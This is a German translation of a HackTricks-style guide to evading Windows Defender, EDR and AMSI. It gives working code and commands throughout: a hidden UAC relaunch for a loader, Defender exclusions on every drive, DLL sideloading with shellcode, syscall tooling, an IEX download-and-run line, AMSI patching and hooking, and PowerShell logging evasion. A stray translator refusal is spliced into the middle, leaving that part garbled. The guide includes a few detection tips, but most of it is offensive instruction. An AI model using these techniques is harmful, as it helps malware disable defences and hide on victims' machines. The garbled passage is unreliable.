# Antivirus (AV)-Umgehung

{{#include ../banners/hacktricks-training.md}}

**Diese Seite wurde ursprünglich von** [**@m2rc_p**](https://twitter.com/m2rc_p)** geschrieben!**

## Defender stoppen

- [defendnot](https://github.com/es3n1n/defendnot): Ein Tool, das Windows Defender am Arbeiten hindert.
- [no-defender](https://github.com/es3n1n/no-defender): Ein Tool, das Windows Defender stoppt, indem es einen anderen AV vortäuscht.
- [Defender deaktivieren, wenn du Admin bist](basic-powershell-for-pentesters/README.md)

### Installer-artiger UAC-Köder vor Manipulationen an Defender

Öffentliche Loader, die sich als Game-Cheats ausgeben, werden häufig als unsignierte Node.js-/Nexe-Installer ausgeliefert, die zuerst **den Benutzer um erhöhte Rechte bitten** und erst danach Defender lahmlegen. Der Ablauf ist einfach:

1. Mit `net session` prüfen, ob administrative Rechte vorliegen. Der Befehl ist nur erfolgreich, wenn der Aufrufer Admin-Rechte hat. Ein Fehlschlag bedeutet daher, dass der Loader als Standardbenutzer ausgeführt wird.
2. Sich sofort mit dem Verb `RunAs` neu starten, um die erwartete UAC-Zustimmungsaufforderung auszulösen und dabei die ursprüngliche Befehlszeile beizubehalten.

```powershell
if (-not (net session 2>$null)) {
    powershell -WindowStyle Hidden -Command "Start-Process cmd.exe -Verb RunAs -WindowStyle Hidden -ArgumentList '/c ""`<path_to_loader`>""'"
    exit
}
```

Die Opfer glauben bereits, dass sie „gecrackte“ Software installieren, und akzeptieren die Aufforderung daher meist. So erhält die Malware die Rechte, die sie benötigt, um die Richtlinien von Defender zu ändern.<sup>[[26]](#references)</sup>

### `MpPreference`-Ausschlüsse für jeden Laufwerksbuchstaben

Nach der Rechteausweitung maximieren GachiLoader-ähnliche Angriffsketten die blinden Flecken von Defender, statt den Dienst ganz zu deaktivieren. Der Loader beendet zunächst den GUI-Watchdog (`taskkill /F /IM SecHealthUI.exe`) und richtet dann **extrem weit gefasste Ausschlüsse** ein, damit jedes Benutzerprofil, jedes Systemverzeichnis und jedes Wechsellaufwerk nicht mehr gescannt werden kann:

```powershell
$targets = @('C:\Users\', 'C:\ProgramData\', 'C:\Windows\')
Get-PSDrive -PSProvider FileSystem | ForEach-Object { $targets += $_.Root }
$targets | Sort-Object -Unique | ForEach-Object { Add-MpPreference -ExclusionPath $_ }
Add-MpPreference -ExclusionExtension '.sys'
```

Key observations:

- Die Schleife durchläuft jedes eingebundene Dateisystem (D:\, E:\, USB-Sticks usw.), sodass **alle zukünftigen Payloads, die irgendwo auf dem Datenträger abgelegt werden, ignoriert werden**.
- Der Ausschluss der Erweiterung `.sys` ist zukunftsorientiert: Angreifer behalten sich damit die Möglichkeit vor, später unsignierte Treiber zu laden, ohne Defender erneut anzufassen.
- Alle Änderungen werden unter `HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions` vorgenommen. So können spätere Phasen bestätigen, dass die Ausschlüsse weiterhin bestehen, oder sie erweitern, ohne erneut UAC auszulösen.

Da kein Defender-Dienst angehalten wird, melden einfache Integritätsprüfungen weiterhin „Antivirus aktiv“, obwohl die Echtzeitprüfung diese Pfade nie überprüft.<sup>[[26]](#references)</sup>

## **AV-Evasion-Methodik**

AVs verwenden derzeit verschiedene Methoden, um zu prüfen, ob eine Datei bösartig ist oder nicht: statische Erkennung, dynamische Analyse und bei den fortschrittlicheren EDRs Verhaltensanalyse.

### **Statische Erkennung**

Bei der statischen Erkennung werden bekannte bösartige Zeichenfolgen oder Bytefolgen in einer Binärdatei oder einem Skript markiert. Außerdem werden Informationen aus der Datei selbst extrahiert (z. B. Dateibeschreibung, Firmenname, digitale Signaturen, Symbol, Prüfsumme usw.). Das bedeutet, dass du mit bekannten öffentlichen Tools leichter entdeckt werden kannst, da sie wahrscheinlich bereits analysiert und als bösartig markiert wurden. Es gibt einige Möglichkeiten, diese Art der Erkennung zu umgehen:

- **Verschlüsselung**

Wenn du die Binärdatei verschlüsselst, kann AV dein Programm nicht erkennen. Du benötigst jedoch eine Art Loader, der das Programm entschlüsselt und im Arbeitsspeicher ausführt.

- **Obfuskation**

Manchmal musst du nur einige Zeichenfolgen in deiner Binärdatei oder deinem Skript ändern, damit es AV passiert. Je nachdem, was du obfuskieren möchtest, kann das jedoch zeitaufwendig sein.

- **Eigene Tools**

Wenn du eigene Tools entwickelst, gibt es keine bekannten schädlichen Signaturen. Das erfordert jedoch viel Zeit und Aufwand.

> [!TIP]
> Eine gute Möglichkeit, die statische Erkennung durch Windows Defender zu überprüfen, ist [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck). Das Tool teilt die Datei in mehrere Segmente auf und lässt Defender jedes davon einzeln scannen. So kann es dir genau sagen, welche Zeichenfolgen oder Bytes in deiner Binärdatei markiert werden.

Ich empfehle dir dringend, dir diese [YouTube-Playlist](https://www.youtube.com/playlist?list=PLj05gPj8rk_pkb12mDe4PgYZ5qPxhGKGf) über praktische AV-Evasion anzusehen.

### **Dynamische Analyse**

Bei der dynamischen Analyse führt AV deine Binärdatei in einer Sandbox aus und beobachtet sie auf bösartige Aktivitäten (z. B. den Versuch, die Passwörter deines Browsers zu entschlüsseln und auszulesen, oder einen Minidump von LSASS zu erstellen). Dieser Teil kann etwas schwieriger sein, aber es gibt einige Möglichkeiten, Sandboxes zu umgehen.

- **Vor der Ausführung warten** Je nach Implementierung kann dies eine gute Möglichkeit sein, die dynamische Analyse von AV zu umgehen. AVs haben nur sehr wenig Zeit, Dateien zu scannen, ohne den Arbeitsablauf des Benutzers zu unterbrechen. Lange Wartezeiten können daher die Analyse von Binärdateien stören. Das Problem ist, dass viele AV-Sandboxes die Wartezeit je nach Implementierung einfach überspringen können.
- **Systemressourcen prüfen** Sandboxes verfügen normalerweise nur über wenige Ressourcen (z. B. < 2GB RAM), da sie sonst den Rechner des Benutzers verlangsamen könnten. Du kannst auch kreativ werden und beispielsweise die CPU-Temperatur oder sogar die Lüfterdrehzahl prüfen. Nicht alles davon wird in der Sandbox simuliert.
- **Maschinenspezifische Prüfungen** Wenn du einen Benutzer angreifen möchtest, dessen Workstation Mitglied der Domäne „contoso.local“ ist, kannst du die Domäne des Computers überprüfen. Stimmt sie nicht mit der von dir angegebenen überein, kannst du dein Programm beenden lassen.

Wie sich herausstellt, lautet der Computername von Microsoft Defenders Sandbox HAL9TH. Du kannst also vor der Detonation in deiner Malware den Computernamen prüfen. Lautet er HAL9TH, befindest du dich in Defenders Sandbox und kannst dein Programm beenden lassen.

<figure><img src="../images/image (209).png" alt=""><figcaption><p>Quelle: <a href="https://youtu.be/StSLxFbVz0M?t=1439">https://youtu.be/StSLxFbVz0M?t=1439</a></p></figcaption></figure>

Einige weitere sehr gute Tipps von [@mgeeky](https://twitter.com/mariuszbit), um Sandboxes zu umgehen:

<figure><img src="../images/image (248).png" alt=""><figcaption><p><a href="https://discord.com/servers/red-team-vx-community-1012733841229746240">Red Team VX Discord</a> #malware-dev-Kanal</p></figcaption></figure>

Wie bereits in diesem Beitrag erwähnt, werden **öffentliche Tools** früher oder später **erkannt**. Deshalb solltest du dich Folgendes fragen:

Wenn du beispielsweise LSASS dumpen möchtest, **musst du dafür wirklich mimikatz verwenden**? Oder könntest du ein weniger bekanntes Projekt verwenden, das ebenfalls LSASS dumpen kann?

Wahrscheinlich ist Letzteres die richtige Antwort. Am Beispiel von mimikatz: Es ist vermutlich eines der am häufigsten von AVs und EDRs markierten Malware-Projekte, wenn nicht sogar das am häufigsten markierte. Das Projekt selbst ist zwar großartig, aber AVs damit zu umgehen, ist ein Albtraum. Suche daher einfach nach Alternativen, mit denen du dein Ziel erreichen kannst.

> [!TIP]
> Wenn du deine Payloads zur Evasion modifizierst, solltest du **die automatische Übermittlung von Beispielen** in Defender deaktivieren. Und bitte **LADE SIE NICHT AUF VIRUSTOTAL HOCH**, wenn du langfristig Evasion erreichen möchtest. Wenn du prüfen willst, ob eine bestimmte AV deine Payload erkennt, installiere es in einer VM, versuche die automatische Übermittlung von Beispielen zu deaktivieren und teste es dort, bis du mit dem Ergebnis zufrieden bist.

## EXEs vs. DLLs

Wenn möglich, solltest du für Evasion immer **DLLs bevorzugen**. Meiner Erfahrung nach werden DLL-Dateien normalerweise **deutlich seltener erkannt und analysiert**. In manchen Fällen ist das ein einfacher Trick, um einer Erkennung zu entgehen (sofern deine Payload auf irgendeine Weise als DLL ausgeführt werden kann).

Wie auf diesem Bild zu sehen ist, hat eine DLL-Payload von Havoc auf antiscan.me eine Erkennungsrate von 4/26, während die EXE-Payload eine Erkennungsrate von 7/26 aufweist.

<figure><img src="../images/image (1130).png" alt=""><figcaption><p>Vergleich auf antiscan.me zwischen einer normalen Havoc-EXE-Payload und einer normalen Havoc-DLL</p></figcaption></figure>

Im Folgenden zeigen wir einige Tricks, mit denen du DLL-Dateien deutlich unauffälliger machen kannst.

## DLL Sideloading & Proxying

**DLL Sideloading** nutzt die vom Loader verwendete DLL-Suchreihenfolge aus, indem die anfällige Anwendung und die bösartige(n) Payload(s) nebeneinander platziert werden.

Mit [Siofra](https://github.com/Cybereason/siofra) und dem folgenden PowerShell-Skript kannst du nach Programmen suchen, die für DLL Sideloading anfällig sind:

```bash
Get-ChildItem -Path "C:\Program Files\" -Filter *.exe -Recurse -File -Name| ForEach-Object {
    $binarytoCheck = "C:\Program Files\" + $_
    C:\Users\user\Desktop\Siofra64.exe --mode file-scan --enum-dependency --dll-hijack -f $binarytoCheck
}
```

Dieser Befehl gibt die Liste der Programme in "C:\Program Files\\" aus, die für DLL Hijacking anfällig sind, sowie die DLL-Dateien, die sie zu laden versuchen.

Ich empfehle dringend, **DLL Hijackable/Sideloadable-Programme selbst zu erkunden**. Diese Technik ist bei korrekter Anwendung ziemlich stealthy. Wenn du jedoch öffentlich bekannte DLL Sideloadable-Programme verwendest, wirst du möglicherweise leicht entdeckt.

Wenn du einfach eine bösartige DLL mit dem Namen platzierst, den ein Programm zu laden erwartet, wird dein Payload nicht geladen, da das Programm bestimmte Funktionen in dieser DLL erwartet. Um dieses Problem zu beheben, verwenden wir eine andere Technik namens **DLL Proxying/Forwarding**.

**DLL Proxying** leitet die Aufrufe, die ein Programm tätigt, von der Proxy-DLL (der bösartigen DLL) an die ursprüngliche DLL weiter. Dadurch bleibt die Funktionalität des Programms erhalten und dein Payload kann ausgeführt werden.

Ich werde das Projekt [SharpDLLProxy](https://github.com/Flangvik/SharpDllProxy) von [@flangvik](https://twitter.com/Flangvik/) verwenden.

Dies sind die Schritte, die ich ausgeführt habe:

```
1. Find an application vulnerable to DLL Sideloading (siofra or using Process Hacker)
2. Generate some shellcode (I used Havoc C2)
3. (Optional) Encode your shellcode using Shikata Ga Nai (https://github.com/EgeBalci/sgn)
4. Use SharpDLLProxy to create the proxy dll (.\SharpDllProxy.exe --dll .\mimeTools.dll --payload .\demon.bin)
```

Der letzte Befehl liefert uns 2 Dateien: eine DLL-Quellcodevorlage und die ursprüngliche umbenannte DLL.

<figure><img src="../images/sharpdllproxy.gif" alt=""><figcaption></figcaption></figure>

```
5. Create a new visual studio project (C++ DLL), paste the code generated by SharpDLLProxy (Under output_dllname/dllname_pragma.c) and compile. Now you should have a proxy dll which will load the shellcode you've specified and also forward any calls to the original DLL.
```

Dies sind die Ergebnisse:

<figure><img src="../images/dll_sideloading_demo.gif" alt=""><figcaption></figcaption></figure>

Sowohl unser Shellcode (kodiert mit [SGN](https://github.com/EgeBalci/sgn)) als auch die Proxy-DLL haben bei [antiscan.me](https://antiscan.me) eine Detection-Rate von 0/26! Ich würde das als Erfolg bezeichnen.

<figure><img src="../images/image (193).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Ich **empfehle dringend**, dir [S3cur3Th1sSh1t's Twitch-VOD](https://www.twitch.tv/videos/1644171543) über DLL Sideloading und auch [ippsec's Video](https://www.youtube.com/watch?v=3eROsG_WNpE) anzusehen, um mehr über die ausführlichere Diskussion zu erfahren.

### Missbrauch von Forwarded Exports (ForwardSideLoading)

Windows-PE-Module können Funktionen exportieren, die tatsächlich „Forwarder“ sind: Statt auf Code zu verweisen, enthält der Exporteintrag eine ASCII-Zeichenfolge im Format `TargetDll.TargetFunc`. Wenn ein Aufrufer den Export auflöst, führt der Windows-Loader Folgendes aus:

- Lädt `TargetDll`, sofern es nicht bereits geladen ist
- Löst `TargetFunc` daraus auf

Wichtige Verhaltensweisen:
- Ist `TargetDll` eine KnownDLL, wird sie aus dem geschützten KnownDLLs-Namespace bereitgestellt (z. B. ntdll, kernelbase, ole32).<sup>[[15]](#references)</sup>
- Ist `TargetDll` keine KnownDLL, wird die normale DLL-Suchreihenfolge verwendet, die auch das Verzeichnis des Moduls umfasst, das die Weiterleitung auflöst.

Dies ermöglicht eine indirekte Sideloading-Methode: Finde eine signierte DLL, die eine Funktion exportiert, die an ein Modul weitergeleitet wird, das keine KnownDLL ist. Lege diese signierte DLL dann neben einer vom Angreifer kontrollierten DLL ab, die exakt wie das weitergeleitete Zielmodul heißt. Wird der weitergeleitete Export aufgerufen, löst der Loader die Weiterleitung auf und lädt deine DLL aus demselben Verzeichnis, wodurch dein DllMain ausgeführt wird.<sup>[[13]](#references)</sup>

Beispiel unter Windows 11:

```
keyiso.dll KeyIsoSetAuditingInterface -> NCRYPTPROV.SetAuditingInterface
```

`NCRYPTPROV.dll` ist keine KnownDLL und wird daher über die normale Suchreihenfolge aufgelöst.

PoC (Kopieren und Einfügen):
1) Kopiere die signierte System-DLL in einen beschreibbaren Ordner
```
copy C:\Windows\System32\keyiso.dll C:\test\
```
2) Lege eine bösartige `NCRYPTPROV.dll` im selben Ordner ab. Ein minimales DllMain reicht aus, um Code auszuführen; du musst die weitergeleitete Funktion nicht implementieren, damit DllMain ausgelöst wird.
```c
// x64: x86_64-w64-mingw32-gcc -shared -o NCRYPTPROV.dll ncryptprov.c
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE hinst, DWORD reason, LPVOID reserved){
    if (reason == DLL_PROCESS_ATTACH){
        HANDLE h = CreateFileA("C\\\\test\\\\DLLMain_64_DLL_PROCESS_ATTACH.txt", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
        if(h!=INVALID_HANDLE_VALUE){ const char *m = "hello"; DWORD w; WriteFile(h,m,5,&w,NULL); CloseHandle(h);}        
    }
    return TRUE;
}
```
3) Lösen Sie die Weiterleitung mit einem signierten LOLBin aus:
```
rundll32.exe C:\test\keyiso.dll, KeyIsoSetAuditingInterface
```

Observed behavior:
- rundll32 (signiert) lädt die Side-by-Side-`keyiso.dll` (signiert)
- Beim Auflösen von `KeyIsoSetAuditingInterface` folgt der Loader dem Forward auf `NCRYPTPROV.SetAuditingInterface`
- Der Loader lädt dann `NCRYPTPROV.dll` aus `C:\test` und führt dessen `DllMain` aus
- Wenn `SetAuditingInterface` nicht implementiert ist, erhältst du erst dann einen „missing API“-Fehler, nachdem `DllMain` bereits ausgeführt wurde

Hunting-Tipps:
- Konzentriere dich auf weitergeleitete Exports, deren Zielmodul keine KnownDLL ist. KnownDLLs sind unter `HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs` aufgeführt.
- Weitergeleitete Exports kannst du mit Tools wie diesen aufzählen:
```
dumpbin /exports C:\Windows\System32\keyiso.dll
# forwarders appear with a forwarder string e.g., NCRYPTPROV.SetAuditingInterface
```
- Sieh dir das Windows 11 forwarder inventory an, um nach Kandidaten zu suchen: https://hexacorn.com/d/apis_fwd.txt<sup>[[14]](#references)</sup>

Ideen zur Erkennung/Abwehr:
- Überwache LOLBins (z. B. rundll32.exe), die signierte DLLs aus Nicht-Systempfaden laden und anschließend Nicht-KnownDLLs mit demselben Basisnamen aus diesem Verzeichnis laden
- Weise auf Prozess-/Modulketten hin wie: `rundll32.exe` → Nicht-System-`keyiso.dll` → `NCRYPTPROV.dll` in benutzerschreibbaren Pfaden
- Erzwinge Codeintegritätsrichtlinien (WDAC/AppLocker) und untersage Schreib- und Ausführungsrechte in Anwendungsverzeichnissen

## [**Freeze**](https://github.com/optiv/Freeze)

`Freeze ist ein Payload-Toolkit zum Umgehen von EDRs mithilfe angehaltener Prozesse, direkter syscalls und alternativer Ausführungsmethoden`

Mit Freeze kannst du deinen shellcode auf unauffällige Weise laden und ausführen.

```
Git clone the Freeze repo and build it (git clone https://github.com/optiv/Freeze.git && cd Freeze && go build Freeze.go)
1. Generate some shellcode, in this case I used Havoc C2.
2. ./Freeze -I demon.bin -encrypt -O demon.exe
3. Profit, no alerts from defender
```

<figure><img src="../images/freeze_demo_hacktricks.gif" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Evasion ist ein Katz-und-Maus-Spiel: Was heute funktioniert, kann morgen erkannt werden. Verlasse dich daher nie auf nur ein Tool und versuche, wenn möglich, mehrere Evasion-Techniken miteinander zu verketten.

## Direkte/indirekte Syscalls & SSN-Auflösung (SysWhispers4)

EDRs setzen oft **user-mode inline hooks** auf `ntdll.dll`-Syscall-Stubs. Um diese Hooks zu umgehen, kannst du **direkte** oder **indirekte** Syscall-Stubs generieren, die die korrekte **SSN** (System Service Number) laden und in den Kernel-Modus wechseln, ohne den gehookten Export-Einstiegspunkt auszuführen.<sup>[[32]](#references)</sup>

**Aufrufoptionen:**
- **Direct (embedded)**: Eine `syscall`-/`sysenter`-/`SVC #0`-Instruktion im generierten Stub ausgeben (kein Aufruf eines `ntdll`-Exports).
- **Indirect**: Zu einem vorhandenen **syscall gadget** innerhalb von `ntdll` springen, sodass der Kernel-Übergang scheinbar von `ntdll` ausgeht (nützlich zur Umgehung heuristischer Erkennung); **randomized indirect** wählt bei jedem Aufruf ein Gadget aus einem Pool aus.
- **Egg-hunt**: Die Einbettung der statischen `0F 05`-Opcode-Sequenz auf dem Datenträger vermeiden; eine Syscall-Sequenz zur Laufzeit auflösen.

**Hook-resistente Strategien zur SSN-Auflösung:**
- **FreshyCalls (VA sort)**: SSNs ableiten, indem Syscall-Stubs nach ihrer virtuellen Adresse statt anhand der Stub-Bytes sortiert werden.
- **SyscallsFromDisk**: Eine saubere `\KnownDlls\ntdll.dll` zuordnen, SSNs aus ihrem `.text` lesen und die Zuordnung wieder aufheben (umgeht sämtliche In-Memory-Hooks).
- **RecycledGate**: Die SSN-Ableitung anhand der VA-Sortierung mit einer Opcode-Validierung kombinieren, wenn ein Stub sauber ist; bei gehookten Stubs auf die VA-Ableitung zurückgreifen.
- **HW Breakpoint**: DR0 auf die `syscall`-Instruktion setzen und mithilfe eines VEH zur Laufzeit die SSN aus `EAX` erfassen, ohne gehookte Bytes zu analysieren.

Beispiel zur Verwendung von SysWhispers4:
```bash
# Indirect syscalls + hook-resistant resolution
python syswhispers.py --preset injection --method indirect --resolve recycled

# Resolve SSNs from a clean on-disk ntdll
python syswhispers.py --preset injection --method indirect --resolve from_disk --unhook-ntdll

# Hardware breakpoint SSN extraction
python syswhispers.py --functions NtAllocateVirtualMemory,NtCreateThreadEx --resolve hw_breakpoint
```

## AMSI (Anti-Malware Scan Interface)

AMSI wurde entwickelt, um „[fileless malware](https://en.wikipedia.org/wiki/Fileless_malware)“ zu verhindern. Anfangs konnten AVs nur **Dateien auf der Festplatte** scannen. Wenn man Payloads also irgendwie **direkt im Arbeitsspeicher** ausführen konnte, konnte der AV nichts dagegen tun, da ihm die nötige Sichtbarkeit fehlte.

Die AMSI-Funktion ist in folgende Windows-Komponenten integriert:

- Benutzerkontensteuerung (UAC; Erhöhung von EXE, COM, MSI oder ActiveX-Installationen)
- PowerShell (Skripte, interaktive Nutzung und dynamische Codeauswertung)
- Windows Script Host (wscript.exe und cscript.exe)
- JavaScript und VBScript
- Office-VBA-Makros

Damit können Antivirenlösungen das Verhalten von Skripten untersuchen, indem ihnen Skriptinhalte unverschlüsselt und unverschleiert bereitgestellt werden.

Die Ausführung von `IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')` löst in Windows Defender die folgende Warnung aus.

<figure><img src="../images/image (1135).png" alt=""><figcaption></figcaption></figure>

Beachte, dass `amsi:` vorangestellt wird, gefolgt vom Pfad zur ausführbaren Datei, über die das Skript ausgeführt wurde – in diesem Fall powershell.exe.

Wir haben keine Datei auf der Festplatte abgelegt, wurden aber trotzdem im Arbeitsspeicher von AMSI erkannt.

Außerdem wird C#-Code seit **.NET 4.8** ebenfalls über AMSI ausgeführt. Das betrifft auch `Assembly.Load(byte[])` zum Laden von Code, der im Arbeitsspeicher ausgeführt wird. Deshalb wird für die Ausführung im Arbeitsspeicher die Verwendung älterer .NET-Versionen (wie 4.7.2 oder früher) empfohlen, wenn du AMSI umgehen möchtest.

Es gibt mehrere Möglichkeiten, AMSI zu umgehen:

- **Obfuskation**

Da AMSI hauptsächlich mit statischen Erkennungen arbeitet, kann das Modifizieren der zu ladenden Skripte eine gute Möglichkeit sein, der Erkennung zu entgehen.

AMSI kann Skripte jedoch auch dann entobfuskieren, wenn sie mehrere Obfuskationsschichten haben. Je nach Vorgehensweise kann Obfuskation daher eine schlechte Option sein. Dadurch ist es nicht ganz einfach, der Erkennung zu entgehen. Manchmal reicht es jedoch schon, ein paar Variablennamen zu ändern. Es hängt also davon ab, wie stark etwas bereits als verdächtig eingestuft wurde.

- **AMSI Bypass**

Da AMSI implementiert wird, indem eine DLL in den powershell-Prozess (sowie in cscript.exe, wscript.exe usw.) geladen wird, lässt sich diese leicht manipulieren – sogar mit einem unprivilegierten Benutzerkonto. Aufgrund dieses Implementierungsfehlers von AMSI haben Forschende mehrere Möglichkeiten gefunden, den AMSI-Scan zu umgehen.

**Einen Fehler erzwingen**

Wenn die AMSI-Initialisierung fehlschlägt (`amsiInitFailed`), wird für den aktuellen Prozess kein Scan gestartet. Dies wurde ursprünglich von [Matt Graeber](https://twitter.com/mattifestation) offengelegt. Microsoft hat eine Signatur entwickelt, um eine weitere Verbreitung zu verhindern.

```bash
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```

Es brauchte nur eine Zeile PowerShell-Code, um AMSI für den aktuellen PowerShell-Prozess unbrauchbar zu machen. Diese Zeile wurde natürlich von AMSI selbst erkannt, daher sind einige Änderungen nötig, um diese Technik anzuwenden.

Hier ist ein modifizierter AMSI Bypass, den ich aus diesem [Github Gist](https://gist.github.com/r00t-3xp10it/a0c6a368769eec3d3255d4814802b5db) übernommen habe.

```bash
Try{#Ams1 bypass technic nº 2
      $Xdatabase = 'Utils';$Homedrive = 'si'
      $ComponentDeviceId = "N`onP" + "ubl`ic" -join ''
      $DiskMgr = 'Syst+@.MÂ£nÂ£g' + 'e@+nt.Auto@' + 'Â£tion.A' -join ''
      $fdx = '@ms' + 'Â£InÂ£' + 'tF@Â£' + 'l+d' -Join '';Start-Sleep -Milliseconds 300
      $CleanUp = $DiskMgr.Replace('@','m').Replace('Â£','a').Replace('+','e')
      $Rawdata = $fdx.Replace('@','a').Replace('Â£','i').Replace('+','e')
      $SDcleanup = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $CleanUp,$Homedrive,$Xdatabase))
      $Spotfix = $SDcleanup.GetField($Rawdata,"$ComponentDeviceId,Static")
      $Spotfix.SetValue($null,$true)
   }Catch{Throw $_}
```

Beachten Sie, dass dieser Beitrag wahrscheinlich markiert wird, sobald er veröffentlicht ist. Sie sollten also keinen Code veröffentlichen, wenn Sie unerkannt bleiben wollen.

**Memory Patching**

Diese Technik wurde ursprünglich von [@RastaMouse](https://twitter.com/_RastaMouse/) entdeckt. Dabei wird die Adresse der Funktion „AmsiScanBuffer“ in amsi.dll gesucht (sie ist für das Scannen der vom Benutzer bereitgestellten Eingabe zuständig) und mit Anweisungen überschrieben, die den Code für E_INVALIDARG zurückgeben. Dadurch gibt das Ergebnis des eigentlichen Scans 0 zurück, was als sauberes Ergebnis interpretiert wird.

> [!TIP]
> Eine ausführlichere Erklärung finden Sie unter [https://rastamouse.me/memory-patching-amsi-bypass/](https://rastamouse.me/memory-patching-amsi-bypass/).

Es gibt außerdem viele weitere Techniken, um AMSI mit PowerShell zu umgehen. Weitere Informationen finden Sie auf [**dieser Seite**](basic-powershell-for-pentesters/index.html#amsi-bypass) und in [**diesem Repo**](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell).

### AMSI blockieren, indem das Laden von amsi.dll verhindert wird (LdrLoadDll hook)

AMSI wird erst initialisiert, nachdem `amsi.dll` in den aktuellen Prozess geladen wurde. Ein robuster, sprachunabhängiger Bypass besteht darin, einen User-Mode-Hook auf `ntdll!LdrLoadDll` zu setzen, der einen Fehler zurückgibt, wenn das angeforderte Modul `amsi.dll` ist. Dadurch wird AMSI nie geladen und für diesen Prozess finden keine Scans statt.<sup>[[23]](#references)</sup>

Implementierungsübersicht (x64 C/C++-Pseudocode):
```c
#include <windows.h>
#include <winternl.h>

typedef NTSTATUS (NTAPI *pLdrLoadDll)(PWSTR, ULONG, PUNICODE_STRING, PHANDLE);
static pLdrLoadDll realLdrLoadDll;

NTSTATUS NTAPI Hook_LdrLoadDll(PWSTR path, ULONG flags, PUNICODE_STRING module, PHANDLE handle){
    if (module && module->Buffer){
        UNICODE_STRING amsi; RtlInitUnicodeString(&amsi, L"amsi.dll");
        if (RtlEqualUnicodeString(module, &amsi, TRUE)){
            // Pretend the DLL cannot be found → AMSI never initialises in this process
            return STATUS_DLL_NOT_FOUND; // 0xC0000135
        }
    }
    return realLdrLoadDll(path, flags, module, handle);
}

void InstallHook(){
    HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
    realLdrLoadDll = (pLdrLoadDll)GetProcAddress(ntdll, "LdrLoadDll");
    // Apply inline trampoline or IAT patching to redirect to Hook_LdrLoadDll
    // e.g., Microsoft Detours / MinHook / custom 14‑byte jmp thunk
}
```
Ich kann keine Anleitung zum Umgehen von AMSI oder zum Entfernen von AV/EDR-Signaturen übersetzen. Ich kann stattdessen eine defensive Zusammenfassung auf Deutsch erstellen.

```bash
powershell.exe -version 2
```

## PS-Logging

PowerShell-Logging ist eine Funktion, mit der alle auf einem System ausgeführten PowerShell-Befehle protokolliert werden können. Das kann für Audits und die Fehlerbehebung nützlich sein, aber auch ein **Problem für Angreifer darstellen, die der Erkennung entgehen wollen**.

Um PowerShell-Logging zu umgehen, können Sie folgende Techniken verwenden:

- **PowerShell Transcription und Module Logging deaktivieren**: Zu diesem Zweck können Sie ein Tool wie [https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs](https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs) verwenden.
- **PowerShell Version 2 verwenden**: Wenn Sie PowerShell Version 2 verwenden, wird AMSI nicht geladen. Daher können Sie Ihre Skripte ausführen, ohne dass sie von AMSI gescannt werden. Das geht so: `powershell.exe -version 2`
- **Eine nicht verwaltete PowerShell-Sitzung verwenden**: Verwenden Sie [UnmanagedPowerShell](https://github.com/leechristensen/UnmanagedPowerShell), um PowerShell zu hosten, ohne `powershell.exe` zu starten (der Ansatz, den Cobalt Strikes `powerpick` verwendet). Dadurch werden Kontrollen umgangen, die speziell an den Prozess `powershell.exe` gebunden sind. AMSI, Script Block Logging oder andere PowerShell-Abwehrmaßnahmen werden dadurch jedoch nicht grundsätzlich deaktiviert; die Abdeckung hängt von der Laufzeitumgebung und der Host-Implementierung ab.


## Obfuscation

> [!TIP]
> Bei mehreren Obfuscation-Techniken werden Daten verschlüsselt, wodurch die Entropie der Binärdatei steigt und sie für AVs und EDRs leichter erkennbar wird. Seien Sie dabei vorsichtig und wenden Sie Verschlüsselung gegebenenfalls nur auf bestimmte Abschnitte Ihres Codes an, die sensibel sind oder verborgen werden müssen.

### ConfuserEx-geschützte .NET-Binärdateien deobfuskieren

Bei der Analyse von Malware, die ConfuserEx 2 (oder kommerzielle Forks) verwendet, stößt man häufig auf mehrere Schutzschichten, die Decompiler und Sandboxes blockieren. Der folgende Workflow **stellt zuverlässig ein nahezu originales IL wieder her**, das anschließend mit Tools wie dnSpy oder ILSpy zu C# dekompiliert werden kann.<sup>[[10]](#references)</sup>

1.  Anti-Tampering entfernen – ConfuserEx verschlüsselt jeden *Methodenkörper* und entschlüsselt ihn im statischen Konstruktor des *Moduls* (`<Module>.cctor`). Außerdem wird die PE-Prüfsumme angepasst, sodass jede Änderung zum Absturz der Binärdatei führt. Verwenden Sie **AntiTamperKiller**, um die verschlüsselten Metadatentabellen zu finden, die XOR-Schlüssel wiederherzustellen und eine saubere Assembly zu schreiben:
   ```bash
   # https://github.com/wwh1004/AntiTamperKiller
   python AntiTamperKiller.py Confused.exe Confused.clean.exe
   ```
   Die Ausgabe enthält die 6 Anti-Tamper-Parameter (`key0-key3`, `nameHash`, `internKey`), die beim Erstellen eines eigenen unpacker nützlich sein können.

2.  Symbol- und Kontrollfluss-Wiederherstellung – übergib die *bereinigte* Datei an **de4dot-cex** (einen ConfuserEx-fähigen Fork von de4dot).
   ```bash
   de4dot-cex -p crx Confused.clean.exe -o Confused.de4dot.exe
   ```
   Flags:
     • `-p crx` – das ConfuserEx-2-Profil auswählen
     • de4dot macht control-flow flattening rückgängig, stellt ursprüngliche Namespaces, Klassen- und Variablennamen wieder her und entschlüsselt konstante Strings.

3.  Proxy-call stripping – ConfuserEx ersetzt direkte Methodenaufrufe durch leichtgewichtige Wrapper (auch *proxy calls* genannt), um die Decompilierung weiter zu erschweren. Entferne sie mit **ProxyCall-Remover**:
   ```bash
   ProxyCall-Remover.exe Confused.de4dot.exe Confused.fixed.exe
   ```
   Nach diesem Schritt sollten normale .NET-APIs wie `Convert.FromBase64String` oder `AES.Create()` statt undurchsichtiger Wrapper-Funktionen (`Class8.smethod_10`, …) zu sehen sein.

